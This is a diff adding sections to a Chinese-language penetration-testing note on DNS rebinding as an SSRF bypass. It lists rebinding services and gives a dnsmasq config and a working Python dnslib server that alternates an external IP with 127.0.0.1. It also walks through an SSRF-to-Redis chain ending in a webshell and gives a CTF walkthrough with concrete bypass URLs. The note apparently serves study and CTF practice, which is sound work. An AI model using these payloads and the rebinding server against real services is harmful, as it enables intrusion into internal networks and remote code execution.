@@ -46,6 +46,146 @@ DNS Rebinding 常被用作 SSRF 绕过手段。
 - 内外网判断
 - “禁止访问 127.0.0.1 / 10.x / 192.168.x.x” 这类简单限制
 
+## 工具与平台
+
+### 1. rbndr（零部署，开箱即用）
+[taviso/rbndr](https://github.com/taviso/rbndr) 提供的公共 rebinding 域名，把两个 IP 编进子域名，每次解析**随机返回其中一个**：
+
+```text
+# 格式：<IP1>.<IP2>.rbndr.us，IP 支持十六进制等常见写法（7f000001 即 127.0.0.1）
+7f000001.8.8.8.8.rbndr.us
+# 8.8.8.8 也可写成十六进制 08080808：
+7f000001.08080808.rbndr.us
+# 每次查询随机返回 8.8.8.8 或 127.0.0.1，TTL 为 1s
+```
+
+用法：把该域名填进 SSRF 参数，多次请求直到命中"第一次解析（校验）拿到 8.8.8.8、第二次解析（连接）拿到 127.0.0.1"的顺序。先用 dig 验证轮询行为：
+
+```bash
+# 连续查询，观察两次结果是否交替/随机
+dig +short 7f000001.8.8.8.8.rbndr.us
+dig +short 7f000001.8.8.8.8.rbndr.us
+```
+
+### 2. rebind.network
+类似的公共服务，提供随机 / 可配置的 rebinding 域名，免去自建，适合快速验证。
+
+### 3. 自建：dnsmasq / BIND 极短 TTL 轮换
+公共服务不可控（随机顺序）时自建 DNS，**按序返回**更稳：
+
+```bash
+# dnsmasq 思路：TTL 压到 1s + 定时切换 A 记录
+# /etc/dnsmasq.conf
+local-ttl=1
+address=/rebind.evil.com/1.2.3.4
+# 配合脚本每 N 秒把上面这行在 1.2.3.4 与 127.0.0.1 之间切换后 reload
+```
+
+BIND 思路：用 `nsupdate` 动态更新 A 记录（先 1.2.3.4 后 127.0.0.1），TTL 设 1。核心是 **TTL≤1 且链路上无强制缓存层**。
+
+### 4. 自写脚本：Python + dnslib 最小实现
+状态可控、能"按序"返回，比随机轮询命中率高：
+
+```python
+# 最小思路：dnslib 起一个权威 DNS，按解析次数交替返回两个 IP
+from dnslib import RR, A
+from dnslib.server import DNSServer, BaseResolver
+
+class RebindResolver(BaseResolver):
+    def __init__(self, a='1.2.3.4', b='127.0.0.1'):
+        self.a, self.b = a, b   # a: 外网 IP（过校验用）  b: 内网 IP（真正访问）
+        self.n = 0
+
+    def resolve(self, request, handler):
+        self.n += 1
+        ip = self.a if self.n % 2 == 1 else self.b   # 第一次返回 a，第二次返回 b
+        reply = request.reply()
+        reply.add_answer(RR(request.q.qname, ttl=1, rdata=A(ip)))
+        return reply
+
+resolver = RebindResolver()
+server = DNSServer(resolver, port=53, address='0.0.0.0')
+server.start()
+# 部署要点：域名 NS 指向本机、防火墙放行 53/UDP、ttl=1 防上游缓存
+```
+
+## 攻击流程演示：SSRF + Rebinding 打内网 Redis
+
+**前置条件**：目标站 `http://target/fetch?url=` 存在 SSRF；服务端逻辑为"先解析域名校验 IP 是否公网，通过后再发起真实请求"（即存在**两次解析**）。
+
+### 请求时序表
+
+| 步骤 | 时刻 | DNS 解析结果 | 服务端动作 | 结果 |
+| --- | --- | --- | --- | --- |
+| 0 | T0 | — | 攻击者提交 `url=http://rebind.evil.com:6379/info` | 进入校验流程 |
+| 1 | T1 | `1.2.3.4`（外网 IP） | 第一次解析做 IP 校验："是公网 IP，放行" | 校验通过 |
+| 2 | T2 | `127.0.0.1`（TTL=1 已过期） | 发起真实请求前再次解析，拿到内网 IP | 连接到 127.0.0.1:6379 |
+| 3 | T2+ | — | HTTP 请求直落 Redis 端口 | Redis 收到畸形命令但可注入 |
+| 4 | T3 | — | 换 gopher:// payload 下发 RESP 命令 | 写 webshell / 计划任务 → RCE |
+
+### 关键细节
+
+- **两次解析是前提**：若目标"校验与连接共用同一次解析"（DNS 结果缓存在变量里），rebinding 无效——先确认目标确实会多次解析（观察两次解析时机、或响应差异）
+- **TTL 必须 ≤1**：上游 DNS、系统缓存（如 systemd-resolved、Java 的 `networkaddress.cache.ttl`）都可能让第二次解析拿到旧结果；TTL 设 0/1，并确认链路上无强制缓存
+- **随机 vs 按序**：rbndr 是随机 50/50，要撞运气多次提交；自建 dnslib 脚本"第一次必给外网、第二次必给内网"，一次成功
+- **Redis 侧利用**：HTTP 请求行会被 Redis 当错误命令丢弃，但后续注入的 RESP 指令照常执行；无 gopher 支持时改用 CRLF 注入拼命令（详见 [EXP-CRLF](./EXP-CRLF.md) 的 Redis 联动小节）
+
+## 案例：一道 SSRF + DNS Rebinding CTF 题流程
+
+**题目背景**：`http://chall/fetch?url=` 可让服务端代取 URL，flag 位于 `http://127.0.0.1:5000/flag` 的内网服务上，目标绕过 IP 校验。
+
+**Step 1 直连试探**：
+
+```text
+/fetch?url=http://127.0.0.1:5000/flag
+→ "forbidden: private ip"
+```
+
+服务端对字面 IP 做了黑名单（127/8、10/8、172.16-31、192.168/16、169.254/16）。
+
+**Step 2 进制绕过试探**：
+
+```text
+/fetch?url=http://2130706433:5000/flag     # 127.0.0.1 的十进制整数
+/fetch?url=http://0x7f.1:5000/flag          # 十六进制混合写法
+→ 同样被拦
+```
+
+进制花活失效，说明黑名单在**解析成 IP 之后**判断——只能靠"两次解析结果不同"绕过。
+
+**Step 3 302 跳转试探**：
+
+```text
+/fetch?url=http://evil.com/r.php            # r.php 返回 302 Location: http://127.0.0.1:5000/flag
+→ "forbidden: private ip"
+```
+
+应用跟随跳转时也会校验目标 IP，302 绕过失效。但注意：跳转目标是被**再解析**后校验的，说明应用确实存在多次解析——rebinding 有戏。
+
+**Step 4 DNS Rebinding 收割**：
+
+```text
+# 方案 A：公共 rbndr（随机轮询，多提交几次直到命中正确顺序）
+/fetch?url=http://7f000001.08080808.rbndr.us:5000/flag
+
+# 方案 B：自建 dnslib 按序返回（第一次 1.2.3.4 / 第二次 127.0.0.1，一次成功）
+/fetch?url=http://rebind.evil.com:5000/flag
+```
+
+- 第一次解析（校验）→ `1.2.3.4`，公网 IP，放行
+- 第二次解析（连接）→ `127.0.0.1`，请求直达 flag 服务
+
+**Step 5 拿到结果**：
+
+```text
+→ {"flag": "flag{dns_reb1nd1ng_byp4ss}"}
+```
+
+**复盘要点**：
+- 第一步永远是判断"校验与连接是否分离"（见上文排查思路）
+- 进制绕过失效不是坏消息——它反而证明校验发生在解析之后，rebinding 正是对症下药
+- TTL / 缓存是主要失败原因：内网存在 DNS 缓存层时，改用 TTL=0 + 每次随机子域名（`<random>.rebind.evil.com`）强制回源解析
+
 ## 常见排查思路
 ### 1. 看校验与请求是否分离
 如果业务是：
@@ -96,3 +236,7 @@ DNS 缓存、代理缓存、应用层缓存都会影响利用稳定性。
 
 ## Reference
 - [从 0 到 1 认识 DNS 重绑定攻击](https://xz.aliyun.com/t/7495)
+- [taviso/rbndr - DNS Rebinding 服务（GitHub）](https://github.com/taviso/rbndr)
+- [rebind.network - 可配置 rebinding 服务](https://rebind.network)
+- [Stanford - Protecting Browsers from DNS Rebinding Attacks（经典论文，SISL 项目页）](https://crypto.stanford.edu/dns/)
+- [tobyh.com/research - DNS Rebinding 相关研究](https://tobyh.com/research/)
